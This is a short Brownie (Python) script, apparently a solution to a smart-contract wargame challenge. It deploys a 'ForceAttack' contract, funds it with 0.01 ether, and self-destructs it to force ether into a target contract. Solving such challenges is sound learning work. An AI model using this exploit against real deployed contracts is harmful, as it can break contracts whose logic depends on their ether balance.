from brownie import accounts, config, ForceAttack

def main(target):
    hacker = accounts.add(config['wallets']['from_key'])
    attack = ForceAttack.deploy({'from': hacker})
    print("Transfer to attack")
    hacker.transfer(to=attack.address, amount="0.01 ether")
    print("Destroy attack")
    attack.destroy(target, {'from': hacker})

